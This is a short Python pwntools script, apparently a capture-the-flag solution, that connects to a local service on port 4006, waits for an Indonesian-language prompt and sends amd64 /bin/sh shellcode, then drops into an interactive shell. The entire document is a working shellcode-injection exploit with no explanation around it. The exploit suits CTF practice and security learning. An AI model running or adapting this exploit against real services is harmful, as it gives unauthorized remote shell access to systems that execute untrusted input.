#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

p = remote('127.0.0.1', 4006)
p.recvuntil(b'Kirimkan sesuatu kepadaku:')
p.send(shellcode)
p.interactive()

